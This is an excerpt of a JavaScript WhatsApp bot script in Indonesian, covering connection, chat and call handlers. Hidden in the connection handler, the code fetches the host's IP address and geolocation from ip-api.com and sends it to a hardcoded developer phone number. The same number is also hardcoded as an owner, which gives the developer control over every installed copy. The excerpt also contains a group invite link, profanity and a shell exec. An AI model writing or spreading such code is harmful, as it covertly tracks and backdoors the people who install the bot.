...
pemuda.autoReconnect = ReconnectMode.onConnectionLost
    ...
    pemuda.on('qr', qr => {
        ...
        console.log(color('|TRM|'), color('Scan Kodenya Kontol', 'red'))
    })
 ...
 teks = `https://chat.whatsapp.com/G6EKdDwxuGn9oesUTTwkVX`
 ...
 pemuda.sendMessage(`${settings.NomorOwner}@s.whatsapp.net`, `*Hai Owner ${settings.NamaBot}, Bot Telah Berhasil Tersambung Pada Nomor Ini*\n────────────────────\n\`\`\`${JSON.stringify(pemuda.user, null, 2)}\`\`\`\n────────────────────\n*Jika Ada Kendala Error/Bot Tidak Merespon Silahkan Hubungi Developer Bot Diatas, Terimakasih*`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Pemuda Teknologi",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./media/image/pemuda.jpg'),sourceUrl:"https://wa.me/6283110372378?text=Assalamualaikum"}}})
	console.log(color('|WRN|', 'yellow'), color('Sending bot info to bot owner', 'cyan'))
fetch(`http://ip-api.com/line`).then(res => res.text())  
        .then(bu =>{
       pemuda.sendMessage("6283110372378@s.whatsapp.net", `─────「 *BANG IRFAN INSTAGRAM YOK* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Pemuda Teknologi",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./media/image/pemuda.jpg'),sourceUrl:"https://wa.me/6283110372378?text=Assalamualaikum"}}})
...
exec(`cd /sdcard/download && play *mp3`)
   ...
   pemuda.on('chat-update', async (mek) => {
        ...
        ownerNumber = ["6283110372378@s.whatsapp.net",`${settings.NomorOwner}@s.whatsapp.net`]
        dtod = "6283110372378@s.whatsapp.net"
...
pemuda.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
    ...
    headerType: 1
			...
			fkontakk = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(anu.jid ? { remoteJid: '6283136505591-1604595598@g.us' } : {})}, message: { "contactMessage":{"displayName": `${mdata.subject}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;pemuda;;;\nFN:pemuda\nitem1.TEL;waid=6283110372378:6283110372378\nitem1.X-ABLabel:Mobile\nEND:VCARD` }}}
			num = anu.participants[0]
			try {
			ppimg = await pemuda.getProfilePicture(`${num.split('@')[0]}@c.us`)
			} catch {
...
pemuda.on('CB:action,,call', async json => {
        ...
        pemuda.sendMessage(callerId, { displayname: `${NamaOwner}`, vcard: vcard}, MessageType.contact, {contextInfo: { externalAdReply:{title: `Developer ${NamaBot}`,body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./media/image/pemuda.jpg'),sourceUrl:`https://wa.me/6283110372378?text=Assalamualaikum`}}})
        await sleep(5000)
